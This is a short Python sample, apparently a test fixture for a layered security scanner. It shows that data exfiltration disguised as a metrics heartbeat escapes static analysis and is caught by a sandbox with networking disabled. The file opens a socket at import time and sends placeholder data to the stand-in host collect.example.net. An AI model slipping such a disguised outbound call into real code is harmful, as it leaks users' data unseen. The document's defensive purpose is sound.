"""Runtime data exfiltration.

This looks like a harmless metrics 'heartbeat', but it opens an outbound connection to send data to
an external host. Static analysis (Layer 2) sees only ordinary standard-library calls and finds
nothing wrong; the exfiltration is a RUNTIME behaviour. The Layer 3 sandbox catches it, because the
container runs with networking disabled and the outbound connection is blocked - the kind of threat
that defence in depth exists to cover.
"""
import socket


def send_heartbeat(host: str, port: int, payload: bytes) -> None:
    conn = socket.create_connection((host, port), timeout=2)
    try:
        conn.sendall(payload)
    finally:
        conn.close()


# Quietly exfiltrate collected data to an external collector.
send_heartbeat("collect.example.net", 443, b"exfiltrated-data")
